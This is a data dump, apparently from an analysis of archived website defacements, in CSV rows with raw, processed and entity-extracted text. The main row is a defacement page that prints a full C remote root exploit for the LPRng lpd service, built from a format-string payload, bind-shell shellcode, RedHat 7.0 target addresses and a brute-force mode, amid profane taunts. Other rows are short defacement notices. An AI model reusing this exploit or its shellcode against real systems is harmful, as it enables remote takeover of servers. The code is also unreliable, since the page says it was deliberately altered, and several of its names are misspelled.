,Unnamed: 0.1,id,path,date,url,tld,text,linklist,processed_text,lowercase,ner_ent
Offset limit hit, ending brute mode ;<\n""); return -1; } } } else format = cseate_malicious_string(); strcpy(exeloit_buffer, address_buffer); strcat(exploit_buffer, format); strcat(exploit_buffer, ""\n""); send_code(exploit_buffer); printf(""failed$#%! dumbass use brute force!\n""); return (-1); } --------------------------------------------------------------- This code was changed so you wont use it ;P ----------------------------------------------------------------- xst is a member of NFC that stands for No fucking
class. You can find us on irc.brasnet.org channel #NFC Admin want a tip ? i guess u want one. but u aint getting a tip from me you fucking lamer. ----------------------------------------------------------------- Now its time for my greets.. here they come greet to m4nuel and the silver lords. peace out homiez. OHHHHH
Fuck i'm busted for this one.. please dont put me in jail. I dont wanna
get ass fucked for the rest of my life.",[],security broken boxsite hacked xst p  hacker russians  world let correct thata little bit russians owns internet world unstopable include stdioh include stdlibh include stringh include unistdh include sysstath include systypesh include fcntlh include netinetinh include arpaineth include netdbh include netinetinh include arpaineth define addressbuffersize  define appendbuffersize  define formatlength  define nopcount  define shellcodecount  define delay  usecs define offsetlimit  char shellcode          struct target char osname ulong eipaddress ulong shellcodeaddress unsigned int position int writtenbytes int align struct target targets redhat  guinesss      redhat  guinesssdev     redhat  guinessss     null      static char  static char  static char  static char hostnamenull static int offset static struct hostent int  int   void calculateretsulong eipaddr ulong shellcodeaddruint previous uint addrloc int unsigned int tmp  unsigned int copied previous unsigned int  unsigned int shellcodeaddr  unsigned intshellcodeaddr   unsigned intshellcodeaddr   unsigned intshellcodeaddr   memset addressbuffer  sizeofaddressbuffer memset appendbuffer  sizeofappendbuffer   copied  copied    numi sprintfappendbufferstrlenappendbuffer dn addrloci else copied numi numi copied  sprintf appendbufferstrlenappendbuffer intnumi copied securityis copied numi copied sprintf appendbufferstrlenappendbuffer dn addrloci else sprintf appendbufferstrlenappendbuffer du numi copied copied numi copied sprintf appendbufferstrlenappendbuffer dn addrloci else tmp numi  copied sprintfappendbufferstrlenappendbuffer du tmp copied numi  copied sprintfappendbufferstrlenappendbuffer dn addrloci sprintf addressbufferstrlenaddressbuffercccc unsignedchar eipaddri  unsignedchareipaddri   unsignedchareipaddri   unsignedchareipaddri   strlenaddressbuffer addressbuffersize strcat addressbufferx ifdef debug printf ngeneration completenaddress  strlenaddressbufferi    printf printf  unsignedcharaddressbufferi printf nappend sn appendbuffer endif return char createmaliciousstringvoid static char  long  int memset formatbuffer  sizeofformatbuffer targetstypeshellcodeaddress targetstypeeipaddress shellcodecount  targetstypeeipaddress  targetstypeshellcodeaddress calculaterets   voidsnprintf formatbuffer  targetstypealign bbbb addressbuffer strncpy addressbuffer formatbuffer  strncpy formatbuffer appendbuffer  fori  nopcount strcatformatbuffer  strcatformatbuffer shellcode return formatbuffer int connectvictim int sockfd struct sockaddrin fdset fdstat char  static char  uname id rn ssinfamily afinet ssinport htons  ssinaddrsaddr ulong hehaddr sockfd socket afinet   printf  create socketn printfexploitfailedn return  connect sockfd struct sockaddr sizeof  return  ifbrute printf eipaddress  targetstypeeipaddress printf shelllocated sn hostname printf entercommands willnn failure  fdzerofdstat fdsetsockfd fdstat sendsockfd testcmd strlentestcmd   fdsetsockfdfdstat   fdissetsockfd fdstat  fprintfstderr eofn return    fdstat  fprintfstderreofn return   break void sendcodechar exploitbuffer int sockfd struct sockaddrin fdset fdstat char  static char  binuname id rn ssinfamily afinet ssinport htons  ssinaddrsaddr ulong hehaddr sockfd socket afinet   printf shitfucking thing aint working dawg printfexploitfailedn  connect sockfd struct sockaddr sizeof  printf  connect sn hostname printfshit faileds aint running lpd fuckn hostname  usleepdelay ifwrite sockfd exploitbuffer strlenexploitbuffer  printf couldnt write socket sockfd printf exploit failedn  closesockfd connectvictim void usagechar program int  printfseclpd icefist electronicsouls nn printfusage victim brute ttype offset align p position r eipaddr c shelladdrw writtenbytes nn program printfie seclpd localhost  formost redhat  boxesn printfie seclpd localhost brute  brute forcing redhat  boxesn printftypesnn targetsiosname null printf type targetsiosname int mainint argc char argv char  char format null int c  ifargc   return  hostname   brute  brute  c getopt argcargv trcaopwk eof switch c caset type atoioptarg break caser targetstypeeipaddress strtouloptarg null  break casec targetstypeshellcodeaddress strtouloptarg null  break casea targetstypealign atoioptarg break caseo offset atoioptarg break casep targetstypeposition atoioptarg break casew targetstypewrittenbytes atoioptarg break default  return  iftype  printfyou must specify typen printfexample seclpd victim  return  gethostbyname hostname null herrorgethostbyname  targetstypeshellcodeaddress targetstypeeipaddress shellcodecount printf securityis remote exploit forlprnglpd digitnn printf exploit informationn printf victim sn hostname printf type sn type targetstypeosname printf eip address  targetstypeeipaddress printf shellcode address  printf position dn targetstypeposition printf alignment dn targetstypealign printf offset dn offset printfn printf attacking formatstringn hostname brute  vrintf brute force time root mofuckahsn targetstypeeipaddress  whilefailure memsetexploitbuffer  sizeofexploitbuffer format createmaliciousstring strcpyexploitbuffer addressbuffer strcatexploitbuffer format strcatexploitbuffer sendcodeexploitbuffer eargetstypeeipaddress  offset  offset offsetlimit printfoffset limit hit ending brute mode return  else format cseatemaliciousstring strcpyexeloitbuffer addressbuffer strcatexploitbuffer format strcatexploitbuffer sendcodeexploitbuffer printffailed dumbass brute forcen return  code changed wont p xst member nfc stands fuckingclass find us ircbrasnetorg channel nfc admin want tip guess u want one u aint getting tip fucking lamer time greets come greet  silver lords peace homiez ohhhhhfuck busted one please dont put jail dont wannaget ass fucked rest life,"your security was broken this box/site was hacked by xst ;p the l33t
russian hacker. we russians 0wns the world.. let me correct that
a little bit we russians owns the internet world ;> we are unstopable. ------------------------------------------ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/stat.h> #include <sys/types.h> #include <fcntl.h> #include <netinet/in.h> #include <arpa/inet.h> #include <netdb.h> #include <netinet/in.h> #include <arpa/inet.h> #define address_buffer_size   32+4 #define append_buffer_size    52 #define format_length        
512-8 #define nopcount      
200 #define shellcode_count      
1030 #define delay              
50000 /* usecs */ #define offset_limit      
5000 char shellcode[] = ""\x31\xdb\x31\xc9\x31\xc0\xb0\x46\xcd\x80"" ""\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"" ""\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"" ""\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"" ""\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"" ""\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"" ""\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"" ""\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"" ""\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh""; struct target { char *os_name; u_long eip_address; u_long shellcode_address; unsigned int position; int written_bytes; int align; }; struct target targets[] = { { ""redhat 7.0 - guinesss    "",
0xbffff3d8, 0l, 300, 70, 2,        
}, { ""redhat 7.0 - guinesss-dev"", 0xbffff12c, 0l,
300, 70, 2,         }, { ""redhat 7.0 - guinessss   "", 0xbffff3d8,
0l, 300, 70, 2,         }, { null, 0l, 0l, 0, 0, 0 } }; static char address_buffer[address_buffer_size+1]; static char append_buffer[append_buffer_size+1]; static char shellcode_buffer[1024]; static char *hostname=null; static int offset; static struct hostent *he; int type=-1; int brute=-1, failure=1; void calculate_rets(u_long eip_addr, u_long shellcode_addr,
u_int previous, u_int addr_loc) { int i; unsigned int tmp = 0; unsigned int copied = previous; unsigned int num[4] = { (unsigned int) (shellcode_addr
& 0x000000ff), (unsigned int)((shellcode_addr
& 0x0000ff00) >> 8), (unsigned int)((shellcode_addr
& 0x00ff0000) >> 16), (unsigned int)((shellcode_addr
& 0xff000000) >> 24) }; memset (address_buffer, '\0', sizeof(address_buffer)); memset (append_buffer, '\0', sizeof(append_buffer)); for (i = 0; i < 4; i++) { while (copied > 0x100) copied
-= 0x100; if ( (i > 0) &&
(num[i-1] == num[i]) ) sprintf
(append_buffer+strlen(append_buffer), ""%%%d$n"", addr_loc+i); else if (copied < num[i]) { if (
(num[i] - copied) <= 10) { sprintf (append_buffer+strlen(append_buffer), ""%.*s"", (int)(num[i] - copied), ""security.is!""); copied += (num[i] - copied); sprintf (append_buffer+strlen(append_buffer), ""%%%d$n"", addr_loc+i);        
} else { sprintf (append_buffer+strlen(append_buffer), ""%%.%du"", num[i] - copied); copied += (num[i] - copied); sprintf (append_buffer+strlen(append_buffer), ""%%%d$n"", addr_loc+i);        
} } else { tmp
= ((num[i] + 0x100) - copied); sprintf
(append_buffer+strlen(append_buffer), ""%%.%du"", tmp); copied
+= ((num[i] + 0x100) - copied); sprintf
(append_buffer+strlen(append_buffer), ""%%%d$n"", addr_loc+i); } sprintf (address_buffer+strlen(address_buffer),
""%c%c%c%c"", (unsigned
char) ((eip_addr+i) & 0x000000ff), (unsigned
char)(((eip_addr+i) & 0x0000ff00) >> 8), (unsigned
char)(((eip_addr+i) & 0x00ff0000) >> 16), (unsigned
char)(((eip_addr+i) & 0xff000000) >> 24)); } while (strlen(address_buffer) < address_buffer_size) strcat (address_buffer,
""x""); #ifdef debug printf (""\ngeneration complete:\naddress:
""); for (i = 0; i < strlen(address_buffer);
i++) { if ( ((i % 4) == 0) &&
(i > 0) ) printf
("".""); printf (""%02x"", (unsigned
char)address_buffer[i]); } printf (""\nappend: %s\n"", append_buffer); #endif return; } char *create_malicious_string(void) { static char format_buffer[format_length+1]; long addr1,addr2; int i; memset (format_buffer, '\0', sizeof(format_buffer)); targets[type].shellcode_address
= targets[type].eip_address + shellcode_count; addr1 = targets[type].eip_address; addr2 = targets[type].shellcode_address; calculate_rets (addr1, addr2,targets[type].written_bytes,
targets[type].position); (void)snprintf (format_buffer, sizeof(format_buffer)-1,
""%.*s%s"", targets[type].align, ""bbbb"", address_buffer); strncpy (address_buffer, format_buffer, sizeof(address_buffer)-1); strncpy (format_buffer, append_buffer, sizeof(format_buffer)-1); for(i = 0 ; i < nopcount ; i++) strcat(format_buffer, ""\x90""); strcat(format_buffer, shellcode); return (format_buffer); } int connect_victim() { int sockfd, n; struct sockaddr_in s; fd_set fd_stat; char buff[1024]; static char testcmd[256] = ""uname -a ; id ;\r\n""; s.sin_family = af_inet; s.sin_port = htons (3879); s.sin_addr.s_addr = *(u_long *)he->h_addr; if ((sockfd = socket (af_inet, sock_stream,
0)) < 0) { printf (""--- [5]
unable to create socket!\n""); printf(""exploit
failed!\n""); return -1; } if ((connect (sockfd, (struct sockaddr *)
&s, sizeof (s))) < 0) { return -1; } if(brute) printf(""+++ the eip_address is 0x%x\n\n"", targets[type].eip_address); printf(""-   [+] shell
located on %s\n"", hostname); printf(""-   [+] enter
commands at will\n\n""); failure = -1; fd_zero(&fd_stat); fd_set(sockfd, &fd_stat); send(sockfd, testcmd, strlen(testcmd), 0); while(1) { fd_set(sockfd,&fd_stat); fd_set(0,&fd_stat); if(select(sockfd+1,&fd_stat,null,null,null)<0)
break; if( fd_isset(sockfd, &fd_stat) ) { if((n=read(sockfd,buff,sizeof(buff)))<0){ fprintf(stderr, ""eof\n""); return 2; } if(write(1,buff,n)<0)break; } if ( fd_isset(0, &fd_stat) ) { if((n=read(0,buff,sizeof(buff)))<0){ fprintf(stderr,""eof\n""); return 2; } if(send(sockfd,buff,n,0)<0) break; } } } void send_code(char *exploit_buffer) { int sockfd, n; struct sockaddr_in s; fd_set fd_stat; char recv[1024]; static char testcmd[256] = ""/bin/uname -a
; id ;\r\n""; s.sin_family = af_inet; s.sin_port = htons (515); s.sin_addr.s_addr = *(u_long *)he->h_addr; if ((sockfd = socket (af_inet, sock_stream,
0)) < 0) { printf (""--- [shit]
fucking thing aint working dawg :(!\n""); printf(""exploit
failed!\n""); exit(-1); } if ((connect (sockfd, (struct sockaddr *)
&s, sizeof (s))) < 0) { printf (""--- [5]
unable to connect to %s\n"", hostname); printf(""shit failed,
%s aint  running lpd (fuck)!\n"", hostname); exit(-1); } usleep(delay); if(write (sockfd, exploit_buffer, strlen(exploit_buffer))
< 0) { printf (""couldn't write to socket %d"", sockfd); printf (""exploit failed\n""); exit(2); } close(sockfd); connect_victim(); } void usage(char *program) { int i=0; printf(""seclpd by icefist of electronicsouls
! \n\n""); printf(""usage: %s victim [\""brute\""] -t
type [-o offset] [-a align] [-p position] [-r eip_addr] [-c shell_addr]
[-w written_bytes] \n\n"", program); printf(""ie: ./seclpd localhost -t 0 for
most redhat 7.0 boxes\n""); printf(""ie: ./seclpd localhost brute -t
0 for brute forcing all redhat 7.0 boxes\n""); printf(""types:\n\n""); while( targets[i].os_name != null) printf (""[ type %d: 
[ %s ]\n"", i++, targets[i].os_name); } int main(int argc, char **argv) { char exploit_buffer[1024]; char *format = null; int c, brutecount=0; if(argc < 3) { usage(argv[0]); return 1; } hostname = argv[1]; if(!strncmp(argv[2], ""brute"", 5)) brute = 1; while(( c = getopt (argc,
argv, ""t:r:c:a:o:p:w:k""))!= eof){ switch (c) { case
't': type = atoi(optarg); break; case
'r': targets[type].eip_address = strtoul(optarg, null, 16); break; case
'c': targets[type].shellcode_address = strtoul(optarg, null, 16); break; case
'a': targets[type].align = atoi(optarg); break; case
'o': offset = atoi(optarg); break; case
'p': targets[type].position = atoi(optarg); break; case
'w': targets[type].written_bytes = atoi(optarg); break; default: usage(argv[0]); return 1; } } if(type < 0) { printf(""you must specify a type!\n""); printf(""example: ./seclpd victim -t
0\n""); return -1; } if ( (he = gethostbyname (hostname)) == null) { herror(""gethostbyname""); exit(1); } targets[type].shellcode_address = targets[type].eip_address
+ shellcode_count; printf(""+++ security.is remote exploit for
lprng/lpd by digit\n\n""); printf(""+++ exploit information\n""); printf(""+++ victim: %s\n"", hostname); printf(""+++ type: %d - %s\n"", type, targets[type].os_name); printf(""+++ eip address: 0x%x\n"", targets[type].eip_address); printf(""+++ shellcode address: 0x%x\n"",
targets[type].shellcode_address); printf(""+++ position: %d\n"", targets[type].position); printf(""+++ alignment: %d\n"", targets[type].align); printf(""+++ offset %d\n"", offset); printf(""\n""); printf(""+++ attacking %s with our format
string\n"", hostname); if( brute > 0 ) { vrintf(""+++ brute force, time to root these mofuckah's
;>\n""); targets[type].eip_address =  0xbffffff0; while(failure) { memset(exploit_buffer, '\0', sizeof(exploit_buffer)); format = create_malicious_string(); strcpy(exploit_buffer, address_buffer); strcat(exploit_buffer, format); strcat(exploit_buffer, ""\n""); send_code(exploit_buffer); eargets[type].eip_address = 0xbffffff0 - offset; offset+=4; if (offset > offset_limit) { printf(""+++
offset limit hit, ending brute mode ;<\n""); return -1; } } } else format = cseate_malicious_string(); strcpy(exeloit_buffer, address_buffer); strcat(exploit_buffer, format); strcat(exploit_buffer, ""\n""); send_code(exploit_buffer); printf(""failed$#%! dumbass use brute force!\n""); return (-1); } --------------------------------------------------------------- this code was changed so you wont use it ;p ----------------------------------------------------------------- xst is a member of nfc that stands for no fucking
class. you can find us on irc.brasnet.org channel #nfc admin want a tip ? i guess u want one. but u aint getting a tip from me you fucking lamer. ----------------------------------------------------------------- now its time for my greets.. here they come greet to m4nuel and the silver lords. peace out homiez. ohhhhh
fuck i'm busted for this one.. please dont put me in jail. i dont wanna
get ass fucked for the rest of my life.","['russian', 'russians', '0wns', 'russians', 'stdio.h', '#', 'sys/stat.h', 'sys/types.h', 'fcntl.h', 'netinet/in.h', 'netinet/in.h', '52 #', '200 #', '1030 #', '5000', '\\x45\\xf4\\x43\\x66\\x89\\x5d\\xec\\x66\\xc7\\x45\\xee\\x0f\\x27\\x89\\x4d\\xf0', '\\x8d\\x45\\xec\\x89\\x45\\xf8\\xc6\\x45\\xfc\\x10\\x89\\xd0\\x8d\\x4d\\xf4\\xcd', '\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x45\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4d\\x08', 'eip_address', '7.0 - guinesss', '0xbffff3d8', '0l', '300', '70', '2', '7.0 - guinesss-dev', '0xbffff12c', '0l', '300', '70', '2', '7.0', '0xbffff3d8', '0l', '300', '70', '2', '0l', '0l', '0', '0', '0', 'char shellcode_buffer[1024', 'int type=-1', 'int tmp', 'shellcode_addr\n& 0x000000ff', '16', '4', '0x100', '-= 0x100', '0', '%%%', '10', '%%%', '%%%', '%%%', '0x00ff0000', '16', '0xff000000', '24', 'ifdef debug', '4', '0', '02x', 'targets[type].eip_address + shellcode_count', '0', '3879', '0', '5', 'eip_address', '0x%x\\n\\n', 'targets[type].eip_address', 'printf(""-\xa0\xa0 [+', 'will\\n\\n', 'fd_set(sockfd', 'null)<0', 'fd_isset(sockfd', 'buff', '2', '2', 'buff', 'recv[1024', '515', '0', '5', '0', 'connect_victim', 'int i=0', 'icefist', 'electronicsouls\n!', '7.0', '0', '7.0', 'int c', '3', '1', '5', '1', 'argc', 'targets[type].eip_address = strtoul(optarg', '16', '16', 'targets[type].position = atoi(optarg', '1', 'if(type', '0', 'gethostbyname', 'printf(""+++', 'information\\n', 'printf(""+++', 'printf(""+++', 'printf(""+++', '0x%x\\n', 'targets[type].eip_address', 'printf(""+++', '0x%x\\n', 'printf(""+++', 'd\\n', 'printf(""+++', 'd\\n', 'printf(""+++', 'd\\n', 'printf(""\\n', '%s', '0', 'vrintf(""+++', 'targets[type].eip_address =\xa0 0xbffffff0', ""{ memset(exploit_buffer, '\\0'"", '0xbffffff0', 'nfc', 'nfc', 'm4nuel', 'homiez', 'ohhhhh']"
14979,14979,14979,/home/michael/Desktop/attrition_analysis/2001/02/14/www.powerdata.dk/index.html,2001-02-14,www.powerdata.dk/,dk,"Multiple Domains! Multiple domains were hit with the same web page defacement.

Domains:
www.powerdata.dk
www.konig-agentur.dk",['mirror.html'],hit web page defacementdomainswwwpowerdatadkwwwkonigagenturdk,"multiple domains! multiple domains were hit with the same web page defacement.

domains:
www.powerdata.dk
www.konig-agentur.dk",[]
16267,16267,16267,/home/michael/Desktop/attrition_analysis/1999/07/26/www.kab.dk/index.html,1999-07-26,www.kab.dk/,dk,"[Welcome]













































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































                      Your site got 0wned by DARKMAN!











































































































































































































































































































































































































































































































































































































































































































































